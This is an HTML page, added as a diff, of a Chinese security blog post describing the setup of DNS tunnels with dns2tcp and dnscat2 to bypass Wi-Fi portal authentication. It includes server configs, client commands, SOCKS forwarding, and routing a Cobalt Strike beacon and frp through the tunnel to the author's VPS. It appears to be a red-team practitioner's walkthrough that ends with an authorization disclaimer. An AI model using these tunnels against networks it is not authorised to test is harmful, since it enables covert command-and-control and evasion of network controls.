@@ -1,0 +1,489 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>记一次绕过WIFI认证的DNS隧道 | c0ys</title>
+<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="记一次绕过WIFI认证的DNS隧道 | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="baiduspider" content="noindex, nofollow">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+
+<script>
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      const hitokoto = document.getElementById('hitokoto_text')
+      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      hitokoto.innerText = data.hitokoto
+    })
+    .catch(console.error)
+</script>
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+  
+    <meta name="description" content="前言
+起因是某次测试目标多了一个wifi，想起之前的近源wifi当中存在不少认证界面，才想着能不能绕过wifi认证界面。且红蓝对抗中TCP不出网的情况下，走dns隧道有时也是奇效。
+关于dns隧道相关工具主流找到的就3种，dnscat2、i..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0ys.cn">
+  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
+  </a>
+  <h1 class="site-title">
+    c0ys
+  </h1>
+  <p class="site-description" id="hitokoto">
+    <a id="hitokoto_text"> 吾心吾行澄如明镜，所作所为皆为正义。</a>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/talk" class="menu">
+          留言
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              记一次绕过WIFI认证的DNS隧道
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-06-10
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://bu.dusays.com/2022/06/10/62a3063c49210.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>起因是某次测试目标多了一个wifi，想起之前的近源wifi当中存在不少认证界面，才想着能不能绕过wifi认证界面。且红蓝对抗中TCP不出网的情况下，走dns隧道有时也是奇效。</p>
+<p>关于dns隧道相关工具主流找到的就3种，dnscat2、iodine、dns2tcp，如下时间问题，只简单试探了其中两种。</p>
+<blockquote>
+<p>VPS记得开防火墙开UDP，我默认之前策略只开了全端口TCP，排错了很久才知道。</p>
+</blockquote>
+<h1 id="域名配置">域名配置</h1>
+<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/06/10/62a305bac21ab.png" alt="" loading="lazy"></figure>
+<table>
+<thead>
+<tr>
+<th>主机记录</th>
+<th>记录类型</th>
+<th>记录值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>dns2tcp</td>
+<td>NS</td>
+<td>ns.lyuan.ink</td>
+</tr>
+<tr>
+<td>ns</td>
+<td>A</td>
+<td>43.1.1.1</td>
+</tr>
+</tbody>
+</table>
+<h2 id="错误判断">错误判断</h2>
+<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/05/23/628b4a83735de.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>注意ns解析，是dig、nslookup直观上看不了了，不知道为何，我之前一直以为ns解析不生效，迷惑了很久，冷静下后看了篇文章抓包53来判断，直接解惑。</p>
+</blockquote>
+<h2 id="正确判断">正确判断</h2>
+<pre><code class="language-python">tcpdump -n -i eth0 udp dst port 53
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/05/23/628b4a8927c61.png" alt="" loading="lazy"></figure>
+<h1 id="dns2tcp">dns2tcp</h1>
+<p><a href="https://github.com/alex-sector/dns2tcp" title="https://github.com/alex-sector/dns2tcp">https://github.com/alex-sector/dns2tcp</a></p>
+<p>默认没有windows端，自己找人家编译好的。</p>
+<figure data-type="image" tabindex="4"><img src="https://bu.dusays.com/2022/05/23/628b4cfc52928.png" alt="" loading="lazy"></figure>
+<p>这里socks5转发用的danted，如果不用socks5转发流量的话，我们客户端的流量只能访问到我们的VPS。</p>
+<h2 id="服务端">服务端</h2>
+<pre><code class="language-python">dns2tcpd -f dns2tcpd.conf -F -d 2
+
+-f 指定了配置文件
+-F 要求程序在前台运行
+-d 2指明了输出调试信息，级别为2
+
+
+# 配置文件
+listen = 0.0.0.0
+port = 53
+user = nobody
+chroot = /tmp
+domain = dns2tcp.lyuan.ink
+resources = ssh:43.1.x.x:22,socks:43.1.x.x:7777
+
+</code></pre>
+<p>这里的配置文件，网上也没几个人教程说明白，也是试错了很久，在一次梦中突然理清，实际上这个ssh和这个socks只是相当于一种自己自定义模式，其中指定的端口，会在客户端<code>-l</code>参数指定转发出去。</p>
+<p>也就是客户端的<code>-z ssh -l 1080 </code>，就是把vps的22端口映射到1080上，到时候客户端连接的时候直接<code>ssh root@127.0.0.1 -p 1080</code>就行。</p>
+<p>反之<code>-z socks -l 1080 </code>，proxifer做好转发把本地的1080转到vps的7777socks，一定要配合danted再把vps的7777流量转发出去，才能上网，才能与互联网通信。</p>
+<h2 id="socks5转发">socks5转发</h2>
+<p>2022年，别用网上粗制滥造的，通篇一样的教程了，网上通篇都是danted，不好装不好说，还要配置文件，这边推荐用proxy。</p>
+<h3 id="proxy-推荐">proxy  [推荐]</h3>
+<blockquote>
+<p>一行命令解决，没有下面danted/sockd那么多事。</p>
+</blockquote>
+<p><a href="https://github.com/snail007/goproxy/blob/master/README_ZH.md" title="https://github.com/snail007/goproxy/blob/master/README_ZH.md">https://github.com/snail007/goproxy/blob/master/README_ZH.md</a></p>
+<pre><code class="language-python">./proxy socks -t tcp -p &quot;0.0.0.0:7777&quot; --udp-port 0 --udp
+</code></pre>
+<h3 id="danted-繁琐">danted [繁琐]</h3>
+<p>由于我是centos，默认没这个包，也是费了老大八尽才装上，自己启动吧。</p>
+<p>看完了网上的通篇讲不清的网络垃圾后想吐🤮了，不如官方wiki，憋着看英文都比这好。</p>
+<ul>
+<li>
+<p><a href="https://zhuanlan.zhihu.com/p/65094630" title="https://zhuanlan.zhihu.com/p/65094630">https://zhuanlan.zhihu.com/p/65094630</a></p>
+</li>
+<li>
+<p><a href="http://www.inet.no/dante/doc/latest/config/server.html" title="http://www.inet.no/dante/doc/latest/config/server.html">http://www.inet.no/dante/doc/latest/config/server.html</a></p>
+</li>
+</ul>
+<p>由于配置文件不对，排错很久，思路主要是如下，希望以后自己看到能想起一些。</p>
+<pre><code class="language-python">sockd -V
+tail /var/log/sockd.log 根据错误日志检查配置文件，直到看见如下。
+--------------
+May 23 14:30:28 sockd[3835119]: info: Dante/server[1/1] v1.4.2 running
+---------------
+接着查看端口是否监听当中
+netstat -ano|grep 7777
+再保守一点抓包看看
+tcpdump port 7777
+
+</code></pre>
+<pre><code class="language-python">Dante v1.4.2.  Copyright (c) 1997 - 2014, Inferno Nettverk A/S, Norway.
+usage: sockd [-DLNVdfhnv]
+   -D             : run in daemon mode
+   -L             : shows the license for this program
+   -N &lt;number&gt;    : fork of &lt;number&gt; servers [1]
+   -V             : verify configuration and exit
+   -d &lt;number&gt;    : set degree of debugging
+   -f &lt;filename&gt;  : use &lt;filename&gt; as configuration file [/etc/sockd.conf]
+   -h             : print this information
+   -n             : disable TCP keep-alive
+   -p &lt;filename&gt;  : write pid to &lt;filename&gt; [/var/run/sockd.pid]
+   -v             : print version info
+</code></pre>
+<p>配置文件</p>
+<pre><code class="language-python">logoutput: /var/log/sockd.log
+internal: eth0 port = 7777
+external: eth0
+socksmethod: username none
+user.privileged: root
+user.unprivileged: nobody
+client pass {
+    from: 0.0.0.0/0 port 1-65535 to: 0.0.0.0/0
+}
+socks pass {
+    from: 0.0.0.0/0 to: 0.0.0.0/0
+    protocol: tcp udp
+}
+</code></pre>
+<h2 id="客户端">客户端</h2>
+<pre><code class="language-python">dns2tcpc.exe -r socks -z dns2tcp.lyuan.ink 43.1.x.x -l 1080 -d 3
+dns2tcpc -r ssh -z dns2tcp.lyuan.ink 43.1.x.x -l 1080 -d 3
+
+dns2tcp v0.5.2 ( http://www.hsc.fr/ )
+Usage : dns2tcpc.exe [options] [server]
+        -c              : enable compression
+        -z &lt;domain&gt;     : domain to use (mandatory)
+         后接你设置的NS记录,和你的VPS公网ip  &lt;公网ip&gt; 可不填，不写将使用中继模式，否则使用直连模式
+         中继模式像我们平时上网一样，DNS解析先经过互联网的迭代解析，最后指向我们的恶意DNS服务器。相比直连，速度较慢，但是更安全。
+        -d &lt;1|2|3&gt;      : debug_level (1, 2 or 3)
+        -r &lt;resource&gt;   : resource to access
+        -k &lt;key&gt;        : pre-shared key
+        -f &lt;filename&gt;   : configuration file
+        -l &lt;port&gt;     : local port to bind (mandatory if resource defined without program )
+        -e &lt;program&gt;    : program to execute
+        -t &lt;delay&gt;      : max DNS server's answer delay in seconds (default is 3)
+        -T &lt;TXT|KEY&gt;    : DNS request type (default is TXT)
+        server  : DNS server to use
+
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://bu.dusays.com/2022/05/23/628b4a9268ff0.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://bu.dusays.com/2022/06/10/62a30617e1b0a.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://bu.dusays.com/2022/06/10/62a30622ce96d.png" alt="" loading="lazy"></figure>
+<h3 id="上线cs">上线cs</h3>
+<blockquote>
+<p>可以直接走dns的listener上线，但好像很麻烦的样子。</p>
+</blockquote>
+<p>我的想法是类似于上面的ssh，将本地的8002监听，转发到公网的listener端口上即可，走一个tcp端口转发即可，然后上线本地的8002端口。</p>
+<p>修改dns2tcp配置文件加上一条。</p>
+<pre><code class="language-python">resources = cs:43.1.x.x:9999
+</code></pre>
+<pre><code class="language-python">dns2tcpc.exe -r cs -z dns2tcp.lyuan.ink 43.1.x.x -l 8002 -d 3
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://bu.dusays.com/2022/06/10/62a3062c1042c.png" alt="" loading="lazy"></figure>
+<p>感受：</p>
+<ul>
+<li>
+<p>cs的上线不稳定</p>
+<p>「老问题，用两台vps就好了，因为此时dns服务器，cs服务器都要交互，本地网速更不上，会出现ICMP隧道搭建一样的问题。<strong>所有流量都走了一个出口，导致的延迟」</strong></p>
+</li>
+<li>
+<p>慎用artifact，一开隧道容易崩，并发太大，建议artifact/beacon只用一个。</p>
+</li>
+<li>
+<p>很卡，百度都打不开，只要并发一多就直接崩，5G打开网页也是很慢的感觉，只能打开一下，也就能截个图，属于是不能用的那种。</p>
+<p>「过一遍dns协议再走socks转发出去，再访问互联网的资源，卡好像很正常，但挂着frp访问内网资源貌似很流畅。」</p>
+</li>
+</ul>
+<h3 id="上线frp">上线frp</h3>
+<p>此处需要在上述服务器建立好socks5转发后，才能。</p>
+<p>客户端dns2cat 1080 端口 —&gt; vps的socks 7777端口 —&gt; vps转发7777 出去才能够上网</p>
+<p>做法也很简单，frpc的配置文件加一条。</p>
+<pre><code class="language-python">[common]
+http_proxy = socks5://127.0.0.1:1080
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://bu.dusays.com/2022/06/10/62a3063c49210.png" alt="" loading="lazy"></figure>
+<p>稳定思密达。</p>
+<figure data-type="image" tabindex="10"><img src="https://bu.dusays.com/2022/06/10/62a30648f1d4d.png" alt="" loading="lazy"></figure>
+<p><strong>感受：</strong></p>
+<ul>
+<li>挺快的。</li>
+</ul>
+<h1 id="dnscat2">dnscat2</h1>
+<p><a href="https://github.com/iagox86/dnscat2" title="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
+<p>建议服务端自己编译，其他平台客户端这里下载：</p>
+<p><a href="https://downloads.skullsecurity.org/dnscat2/" title="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
+<ul>
+<li>
+<p>ruby环境你可能搭建会踩巨多坑，客户端c写的要编译，服务端ruby写的。</p>
+</li>
+<li>
+<p>但实战用起来就是个c2，能命令执行，但隧道方面提供的貌似只有一个端口转发。</p>
+</li>
+<li>
+<p><strong>不需要域名即可，时间不多，这次没有深入。</strong></p>
+</li>
+</ul>
+<h2 id="ruby环境踩坑">ruby环境踩坑</h2>
+<pre><code class="language-python"># 换源
+gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/
+# 安装
+bundle install
+# 不出意外会报错
+好几个报错，写文章的时候又想不起来了，但都在stackoverflow.com找到了答案。
+</code></pre>
+<h2 id="服务端-2">服务端</h2>
+<p>起手直接</p>
+<pre><code class="language-python">ruby dnscat2.rb
+
+</code></pre>
+<p>客户端连接信息都在如下提示信息里面</p>
+<pre><code class="language-python">New window created: 0
+dnscat2&gt; New window created: crypto-debug
+[DEPRECATION] The trollop gem has been renamed to optimist and will no longer be supported. Please switch to optimist as soon as possible.
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach =&gt; false
+history_size (for new windows) =&gt; 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 0.0.0.0:53
+[domains = n/a]...
+
+It looks like you didn't give me any domains to recognize!
+That's cool, though, you can still use direct queries,
+although those are less stealthy.
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=9e96192a779f3978e9dd5d64cf733e39
+
+Of course, you have to figure out &lt;server&gt; yourself! Clients
+will connect directly on UDP port 53.
+</code></pre>
+<h2 id="客户端-2">客户端</h2>
+<p>不会就-h，看github，没什么时间这里写的很仓促。</p>
+<figure data-type="image" tabindex="11"><img src="https://bu.dusays.com/2022/05/23/628b4ad422c0d.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://bu.dusays.com/2022/05/23/628b4addbf30a.png" alt="" loading="lazy"></figure>
+<h1 id="参考">参考</h1>
+<ul>
+<li><a href="https://blog.csdn.net/deng_xj/article/details/88834124" title="https://blog.csdn.net/deng_xj/article/details/88834124">https://blog.csdn.net/deng_xj/article/details/88834124</a></li>
+</ul>
+
+                <blockquote>
+                  <p>声明：本博客文章所分享内容仅用于技术交流，禁止用于违法途径，所有渗透都需获取授权！否则需自行承担，本站及原作者不承担相应的后果。</p>
+                </blockquote>
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%9F%9F%E5%90%8D%E9%85%8D%E7%BD%AE">域名配置</a>
+<ul>
+<li><a href="#%E9%94%99%E8%AF%AF%E5%88%A4%E6%96%AD">错误判断</a></li>
+<li><a href="#%E6%AD%A3%E7%A1%AE%E5%88%A4%E6%96%AD">正确判断</a></li>
+</ul>
+</li>
+<li><a href="#dns2tcp">dns2tcp</a>
+<ul>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF">服务端</a></li>
+<li><a href="#socks5%E8%BD%AC%E5%8F%91">socks5转发</a>
+<ul>
+<li><a href="#proxy-%E6%8E%A8%E8%8D%90">proxy  [推荐]</a></li>
+<li><a href="#danted-%E7%B9%81%E7%90%90">danted [繁琐]</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a>
+<ul>
+<li><a href="#%E4%B8%8A%E7%BA%BFcs">上线cs</a></li>
+<li><a href="#%E4%B8%8A%E7%BA%BFfrp">上线frp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#dnscat2">dnscat2</a>
+<ul>
+<li><a href="#ruby%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91">ruby环境踩坑</a></li>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF-2">服务端</a></li>
+<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-2">客户端</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0ys.cn/post/uVSYQlRm2/">
+              <h3 class="post-title">
+                记一次严苛环境的ICMP隧道
+              </h3>
+            </a>
+          </div>
+        
+      
+        
+            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>
+
+<div id="tcomment"></div>
+<script>
+twikoo.init({
+  envId: 'https://talk.c0ys.cn',
+  el: '#tcomment'
+})
+</script> 
+          
+
+        
+
+        <div class="site-footer">
+  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
+  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
